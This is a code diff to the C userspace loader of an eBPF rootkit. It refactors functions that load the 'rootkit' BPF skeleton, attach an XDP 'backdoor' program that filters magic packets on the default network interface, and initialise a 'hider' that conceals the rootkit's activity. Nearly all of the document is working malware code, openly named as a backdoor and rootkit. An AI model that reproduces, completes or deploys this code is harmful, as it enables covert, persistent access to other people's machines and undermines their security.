@@ -1,23 +1,27 @@
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
 #include <bpf/libbpf.h>
-#include <net/if.h>
-#include <linux/if_link.h>
 #include <errno.h>
+#include <linux/if_link.h>
+#include <net/if.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
 #include "config.h"
-#include "userspace/hider.h"
+#include "userspace/loader.h"
 #include "rootkit.skel.h"
+#include "userspace/hider.h"
+
+#define LINE_LEN     256
+#define DEV_NAME_LEN 64
 
 /**
  * @brief Get the index of the default active interface by reading /proc/net/route
- * 
+ *
  * @return int iface index
  */
-static int get_default_iface_index()
-{
-    char line[256];
-    char dev[64];
+static int get_default_iface_index() {
+    char line[LINE_LEN];
+    char dev[DEV_NAME_LEN];
     unsigned long dest;
 
     FILE *f = fopen("/proc/net/route", "r");
@@ -44,28 +48,23 @@ static int get_default_iface_index()
 
 /**
  * @brief Load XDP backdoor
- * 
+ *
  * @param skel Rootkit skeleton
  * @return int 0 on success
  */
-static int load_xdp_backdoor(struct rootkit *skel)
-{
+static int load_xdp_backdoor(struct rootkit *skel) {
     int if_index = get_default_iface_index();
 
     if (if_index < 0)
         return if_index;
 
-    skel->links.filter_magic_packets = bpf_program__attach_xdp(
-        skel->progs.filter_magic_packets,
-        if_index
-    );
+    skel->links.filter_magic_packets =
+        bpf_program__attach_xdp(skel->progs.filter_magic_packets, if_index);
 
     return libbpf_get_error(skel->links.filter_magic_packets);
-
 }
 
-struct rootkit *load_rootkit(void)
-{
+struct rootkit *loader_load_rootkit(loader_context_t *loader_ctx) {
     int ret;
     struct rootkit *skel;
 
@@ -78,42 +77,36 @@ struct rootkit *load_rootkit(void)
     ret = rootkit__load(skel);
     if (ret) {
         perror("Failed to load and verify BPF skeleton");
-        rootkit__destroy(skel);
-        return NULL;
-    }
-
-    ret = hider_init(skel);
-    if (ret) {
-        perror("Failed to initialize hider");
-        rootkit__destroy(skel);
-        return NULL;
-    }
-
-    ret = hider_set_initial_hide_state();
-    if (ret) {
-        perror("Failed to install initial state");
-        rootkit__destroy(skel);
-        return NULL;
+        goto fail;
     }
 
     ret = load_xdp_backdoor(skel);
     if (ret) {
         perror("Failed to attach XDP backdoor");
-        rootkit__destroy(skel);
-        return NULL;
+        goto fail;
+    }
+
+    loader_ctx->hider_ctx->skel = skel;
+
+    ret = hider_init(loader_ctx->hider_ctx);
+    if (ret) {
+        perror("Failed to initialize hider");
+        goto fail;
     }
 
     ret = rootkit__attach(skel);
     if (ret) {
         perror("Failed to attach BPF skeleton");
-        rootkit__destroy(skel);
-        return NULL;
+        goto fail;
     }
 
     return skel;
+
+fail:
+    rootkit__destroy(skel);
+    return NULL;
 }
 
-void unload_rootkit(struct rootkit *skel)
-{
+void loader_unload_rootkit(struct rootkit *skel) {
     rootkit__destroy(skel);
 }
